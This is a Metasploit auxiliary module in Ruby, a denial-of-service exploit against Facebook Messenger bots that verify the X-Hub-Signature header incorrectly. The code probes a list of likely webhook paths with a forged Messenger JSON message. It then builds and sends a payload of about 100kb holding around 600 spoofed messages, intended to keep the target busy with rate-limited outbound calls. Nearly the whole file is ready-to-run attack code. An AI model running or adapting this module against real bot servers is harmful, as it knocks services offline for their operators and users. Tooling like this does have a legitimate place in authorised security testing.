##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Fb Messenger Bot Dos Exploit',
      'Description'    => %q{
        This module generates a 100kb payload which contains around 600 messages which a bot 
        with wrong X-Hub-Signature implementation will handle like they came from facebook.
        That will cause the bot to start serveral http calls to facebook and 3rd party servers
        which have most likly a rate limiting of 1 request per second. That means one request 
        keeps the server busy for 10 minutes.
      },
      'Author'         =>
        [
          'daaavid.mann@gmail.com', # 2004 gzip bomb advisory
          'dmann'                # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.medium.com/' ]
        ],
      'DisclosureDate' => 'Nov 1 2016',
      ))

    register_options(
      [
        OptInt.new('SIZE', [true, 'Size of uncompressed data in kilobytes (100kb default).', 100]),
        OptInt.new('ROUNDS', [true, 'Number of rounds to hit the server (1 default).', 1]),
      ],
    self.class)
  end

  def run
  	@payload_scan = get_payload_for_message(1200872273321307, "")
    @payload_dos = get_payload_for_message(1200872273321307, "payload", datastore['SIZE'])

    scan_result = nil

    uri_list = %w(%00 webhook bot hook server hookie_hook facebook/receive latest/facebook)
    uri_list.push(*uri_list.map { |uri| "#{uri}/" })

    uri_list.each do |key, array|    
      begin
        opts = {
            'method' => 'POST',
            'uri'   => normalize_uri(key),
            'data'  => @payload_scan,
            'ctype' => "application/json"
        }

        res = send_request_cgi(opts)
        print_status("scanning server for known webhooks: #{key}")     

        if res && res.code == 200
           print_status("found a vulnerable endpoint: #{key}")
          scan_result = key
          break
        else
          next
        end
      rescue ::Rex::ConnectionError => exception
        print_error("#{rhost}:#{rport} - Unable to connect: '#{exception.message}'")
      end
    end

    if !scan_result.nil?
      for x in 1..datastore['ROUNDS']
        print_status("#{rhost}:#{rport} - Sending request ##{x}...")
        opts = {
          'method'  => 'POST',
          'uri'   => normalize_uri(scan_result),
          'data'    => @payload_dos,
          'ctype' => "application/json"
        }
        begin
          c = connect
          r = c.request_cgi(opts)
          c.send_request(r)
          # Don't wait for a response, can take some time
        rescue ::Rex::ConnectionError => exception
          print_error("#{rhost}:#{rport} - Unable to connect: '#{exception.message}'")
          return
        ensure
          disconnect(c) if c
        end
      end
    end
  end
  def bytes_to_kb bytes
    bytes / 1024.0
  end

  def get_payload_for_message(fb_id, text, kb=0)
    entry_json_element = '{"id":"0","time":0,"messaging":[{"sender":{"id":"'+fb_id.to_s+'"},"recipient":{"id":"0"},"timestamp":0,"message":{"mid":"0","seq":0,"text":"'+text.to_s+'"}}]}'
    
    num_msgs = 1
    entry_json = entry_json_element

    while entry_json.bytesize < (kb*1024)-200  do 
      entry_json += "," + entry_json_element  
      num_msgs = num_msgs + 1  
    end 

    packet_size = bytes_to_kb(entry_json.bytesize)
    print_status "Payload generated. Size=#{packet_size}kb. Messages=#{num_msgs}"

    '{"object":"page","entry":['+entry_json+']}'
  end
end